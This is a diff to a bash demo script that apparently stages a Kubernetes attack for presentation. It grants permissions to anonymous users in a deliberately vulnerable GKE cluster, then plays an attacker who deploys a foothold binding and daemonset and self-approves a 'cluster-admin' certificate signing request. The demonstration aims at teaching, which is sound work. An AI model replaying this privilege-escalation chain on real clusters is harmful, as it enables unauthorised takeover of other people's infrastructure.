@@ -23,23 +23,14 @@ fi
 TYPE_SPEED=""
 #DEMO_PROMPT="compromised_node# "
 # Turns out the white defined in demo-magic renders a little grey.
-DEMO_CMD_COLOR=$COLOR_RESET
+DEMO_CMD_COLOR=$BOLD
 clear
 echo ""
 echo ""
 
-function cluster_exists() {
-    EXIST=$(gcloud container clusters list --format json | jq '.[] | select(.name == "gke-customer-cluster") | .name')
+EXIST=$(gcloud container clusters list --format json | jq '.[] | select(.name == "gke-customer-cluster") | .name')
 
-    if [ $EXIST = "gke-customer-cluster" ];
-    then
-        true
-    fi
-
-    false
-}
-
-if cluster_exists;
+if [ $EXIST = "gke-customer-cluster" ];
 then
     gcloud container clusters create --project $PROJECT \
     --cluster-version $VULN_CLUSTER_VERSION \
@@ -53,20 +44,23 @@ gcloud container clusters get-credentials $VULN_CLUSTER_NAME \
 
 ### DEMO ###
 
+clear
+
 echo ""
 
-kubectl apply -f customer_binding.yaml &> /dev/null
-
-clear
 echo ""
 
 DEMO_PROMPT="customer-cluster $ "
 
-pe "kubectl get clusterrolebinding cluster-system-anonymous -o yaml"
+pe "cat customer_binding.yaml"
 
 echo ""
 echo ""
 
+pe "kubectl apply -f customer_binding.yaml"
+
+echo ""
+echo ""
 
 wait
 
@@ -74,7 +68,17 @@ clear
 
 DEMO_PROMPT="attacker-machine $ "
 
-# TODO(vinayakankugoyal): show attacker is scanning ports
+echo "scanning..."
+echo "scanning..."
+echo "scanning..."
+
+wait
+
+echo "target found!"
+
+wait
+
+clear
 
 pe "cat attacker_foothold_binding.yaml"
 
@@ -94,7 +98,6 @@ cat attacker_foothold_daemonset_for_show.yaml
 
 echo ""
 echo ""
-
 
 pe "kubectl apply -f attacker_foothold_daemonset.yaml"
 
@@ -130,14 +133,14 @@ pe "kubectl get csr cluster-admin -o jsonpath='{.spec.request}' | base64 -d | op
 echo ""
 echo ""
 
-sleep 5
+sleep 10
 
 pe "kubectl certificate approve cluster-admin"
 
 echo ""
 echo ""
 
-sleep 5
+sleep 10
 
 pe "kubectl get csr cluster-admin -o jsonpath='{.status.certificate}' | base64 -d | openssl x509 -subject -noout"
 
